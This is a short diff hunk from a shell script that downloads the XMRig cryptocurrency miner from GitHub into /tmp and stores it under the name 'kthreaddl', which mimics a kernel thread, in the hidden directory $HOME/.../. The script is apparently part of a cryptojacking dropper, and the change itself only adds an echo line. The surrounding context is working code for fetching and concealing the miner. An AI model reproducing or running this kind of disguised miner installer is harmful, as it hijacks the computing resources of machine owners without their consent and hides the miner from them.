@@ -969,6 +969,7 @@ if (test $? -ne 0); then
   if [ -f $HOME/.../kthreaddl ]; then
     echo "WARNING: Advanced version of $HOME/.../kthreaddl is not functional"
   fi
+  echo "ReDowloadGithubMaster"
   LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
   LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
   if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/kthreaddl.tar.gz; then
